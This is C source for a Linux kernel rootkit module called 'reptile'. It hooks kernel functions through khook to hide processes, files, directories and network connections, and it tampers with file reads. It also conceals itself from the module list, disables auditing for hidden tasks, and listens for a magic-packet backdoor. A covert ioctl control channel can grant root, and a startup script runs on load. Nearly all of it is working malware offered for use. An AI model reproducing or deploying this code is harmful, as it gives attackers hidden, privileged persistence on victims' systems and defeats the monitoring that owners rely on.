#include <linux/module.h>
#include <linux/version.h>

#include "khook/engine.c"
#include "config.h"
#include "util.h"

#ifdef CONFIG_AUTO_HIDE
#	include "module.h"
#endif

int hidden = 1;

/* ------------------------ HIDE PROCESS ------------------------- */

#ifdef CONFIG_HIDE_PROC

#include <linux/audit.h>
#include "proc.h"

KHOOK(copy_creds);
static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
{
	int ret = 0;

	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
	if (!ret && is_task_invisible(current))
		p->flags |= FLAG;

	return ret;
}

KHOOK(exit_creds);
static void khook_exit_creds(struct task_struct *p)
{
	KHOOK_ORIGIN(exit_creds, p);
	if (is_task_invisible(p))
		p->flags &= ~FLAG;
}

KHOOK(audit_alloc);
static int khook_audit_alloc(struct task_struct *t)
{
	int err = 0;

	if (is_task_invisible(t)) {
		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
	} else {
		err = KHOOK_ORIGIN(audit_alloc, t);
	}
	return err;
}

KHOOK(find_task_by_vpid);
struct task_struct *khook_find_task_by_vpid(pid_t vnr)
{
	struct task_struct *tsk = NULL;

	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
	if (tsk && is_task_invisible(tsk) && !is_task_invisible(current))
		tsk = NULL;

	return tsk;
}

KHOOK_EXT(int, vfs_statx, int, const char __user *, int, struct kstat *, u32);
static int khook_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat,
						u32 request_mask)
{
	if (is_proc_invisible_2(filename))
		return -EINVAL;

	return KHOOK_ORIGIN(vfs_statx, dfd, filename, flags, stat, request_mask);
}

KHOOK_EXT(long, sys_kill, long, long);
static long khook_sys_kill(long pid, long sig) {
    if (sig == 0) {
		if (is_proc_invisible(pid)) {
			return -ESRCH;
		}
	}
    
	return KHOOK_ORIGIN(sys_kill, pid, sig);
}

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *regs) {
    if (regs->si == 0) {
		if (is_proc_invisible(regs->di)) {
			return -ESRCH;
		}
	}
    
	return KHOOK_ORIGIN(__x64_sys_kill, regs);
}

KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
{
	if (hidden) {
		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
			if (!(iter.task->flags & FLAG))
				break;

			iter.tgid++;
		}
	} else {
		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
	}
	return iter;
}

#endif

/* ------------------------- HIDE DIR --------------------------- */

#ifdef CONFIG_HIDE_DIR

#include <linux/dcache.h>
#include "dir.h"

/* Can you see a little problem on those hooks? This is not the best 
 * way to do this feature, but I am going to keep it this way, after all,
 * this is just a public project, isn't it?
 */
KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen,
			    loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void *__buf, const char *name, int namlen,
				loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
#else
KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!strstr(name->name, HIDE) || !hidden)
		found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}
#endif

/* --------------------- FILE CONTENT TAMPERING --------------------- */

#ifdef CONFIG_FILE_TAMPERING

#include "file.h"

atomic_t read_on;
int file_tampering_flag = 0;

// This is not the best way to do that, but it works, maybe in the future I change that
KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
static ssize_t khook_vfs_read(struct file *file, char __user *buf,
			      size_t count, loff_t *pos)
{
	ssize_t ret;

	atomic_set(&read_on, 1);
	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);

	if (file_tampering_flag) {
		if (file_check(buf, ret) == 1)
			ret = hide_content(buf, ret);
	}
	atomic_set(&read_on, 0);

	return ret;
}

#endif

/* ------------------------ HIDE CONNECTIONS ------------------------- */

#ifdef CONFIG_HIDE_CONN

#include <net/inet_sock.h>
#include <linux/seq_file.h>
#include "network.h"

LIST_HEAD(hidden_conn_list);

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
	daddr = inet->inet_daddr;
	//dport = inet->inet_dport;
#else
	daddr = inet->daddr;
	//dport = inet->dport;
#endif

	list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (hc->addr.sin_addr.s_addr == daddr /* && hc->addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
out:
	return ret;
}

KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
	daddr = inet->inet_daddr;
	//dport = inet->inet_dport;
#else
	daddr = inet->daddr;
	//dport = inet->dport;
#endif

	list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (hc->addr.sin_addr.s_addr == daddr /* && hc->addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
out:
	return ret;
}

#endif

/* ----------------------------- BACKDOOR ----------------------------- */

#ifdef CONFIG_BACKDOOR
#include <linux/netdevice.h>
#include "backdoor.h"

KHOOK_EXT(int, ip_rcv, struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int khook_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, 
						struct net_device *orig_dev)
{
	if (magic_packet_parse(skb))
		return KHOOK_ORIGIN(ip_rcv, skb, dev, pt, orig_dev);

	return 0;
}

#endif

/* ------------------------------ COMMON ----------------------------- */

#if defined(CONFIG_HIDE_PROC) && defined(CONFIG_BACKDOOR)
#include <linux/binfmts.h>

KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
static int khook_load_elf_binary(struct linux_binprm *bprm)
{
	int ret = KHOOK_ORIGIN(load_elf_binary, bprm);

	if (!ret && !strcmp(bprm->filename, SHELL_PATH))
		flag_tasks(current->pid, 1);

	return ret;
}
#endif

/* ------------------------------- CONTROL ----------------------------- */

#include <linux/net.h>
#include <linux/in.h>
#include <linux/uaccess.h>

int control_flag = 0;

struct control {
	unsigned short cmd;
	void *argv;
};

KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
			    unsigned long arg)
{
	int ret = 0;
	unsigned int pid;
	struct control args;
	struct sockaddr_in addr;

	if (cmd == AUTH && arg == HTUA) {
		if (control_flag) {
			control_flag = 0;
		} else {
			control_flag = 1;
		}

		goto out;
	}

	if (control_flag && cmd == AUTH) {
		if (copy_from_user(&args, (void *)arg, sizeof(args)))
			goto out;

		switch (args.cmd) {
		case 0:
#ifdef CONFIG_AUTO_HIDE
			hide_module();
#endif
			flip_hidden_flag();
			break;
		case 1:
			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
				goto out;

#ifdef CONFIG_HIDE_PROC
			hide_proc(pid);
#endif
			break;
		case 2:
#ifdef CONFIG_FILE_TAMPERING
			file_tampering();
#endif
			break;
		case 3:
#ifdef CONFIG_GIVE_ROOT
			get_root();
#endif
			break;
		case 4:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

#ifdef CONFIG_HIDE_CONN
			network_hide_add(addr);
#endif
			break;
		case 5:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

#ifdef CONFIG_HIDE_CONN
			network_hide_remove(addr);
#endif
			break;
		default:
			goto origin;
		}

		goto out;
	}

origin:
	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
out:
	return ret;
}

/* ------------------------------------------------------------------ */

static int __init reptile_init(void)
{
	int ret;

#ifdef CONFIG_FILE_TAMPERING
	/* Unfortunately I need to use this to ensure in some kernel
	 * versions we will be able to unload the kernel module when
	 * it is needed. Otherwise khook may take a really huge delay
	 * to unload because of vfs_read hook
	 */
	atomic_set(&read_on, 0);
#endif
	ret = khook_init();
	if (ret < 0)
		return ret;

#ifdef CONFIG_AUTO_HIDE
	hide_module();
#endif

	run_cmd(START_SCRIPT);

	return ret;
}

static void __exit reptile_exit(void)
{
#ifdef CONFIG_FILE_TAMPERING
	while(atomic_read(&read_on) != 0) schedule();
#endif
	khook_cleanup();
}

module_init(reptile_init);
module_exit(reptile_exit);
MODULE_LICENSE("GPL");
